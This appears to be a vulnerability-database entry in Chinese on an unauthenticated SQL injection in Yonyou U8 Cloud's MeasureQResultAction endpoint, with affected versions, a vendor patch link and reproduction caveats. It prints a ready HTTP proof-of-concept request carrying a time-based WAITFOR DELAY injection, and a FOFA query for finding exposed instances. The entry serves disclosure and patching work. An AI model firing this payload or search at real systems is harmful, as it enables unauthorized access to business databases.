---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友U8 Cloud MeasureQResultAction selectQueryCondition SQL 注入"
product: "用友U8 Cloud"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "列1.0至5.1离散版本；SQL Server"
prerequisites: "无Cookie样例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8BU8%20Cloud%20MeasureQResultAction%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "title==\"U8C\""
fofa_unverified: "title=="
id: "vw-1da77402ff340e1b6f70ecbe"
entity_id: "ve-1da77402ff340e1b6f70ecbe"
schema_version: "1"
---

# 用友U8 Cloud MeasureQResultAction selectQueryCondition SQL 注入

## 条目说明

- 对象与具体问题：用友U8 Cloud；MeasureQResultAction selectQueryCondition SQLi
- 版本、配置及部署条件：列1.0至5.1离散版本；SQL Server
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- execute/selectQueryCondition与205 doRefresh不同，不能仅按相似标题并稿
- 5秒延时缺对照/文本结果，在野无出处
- 保留notice598；FOFA残缺及补丁尖括号需规范

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

用友U8 Cloud nc.ui.iufo.query.measurequery.MeasureQResultAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

影响版本

1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp,5.1

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：title=="U8C"

POC/EXP：

```http
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```


![image-20240824180344871](./.resource/用友U8CloudMeasureQResultActionSQL注入漏洞/media/image-20240824180344871.png)


![image-20240824180508524](./.resource/用友U8CloudMeasureQResultActionSQL注入漏洞/media/image-20240824180508524.png)


## 修复方案

升级补丁<U8CLOUD系统MeasureQResultAction接口存在SQL注入漏洞的安全补丁>

https://security.yonyou.com/#/noticeInfo?id=598


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
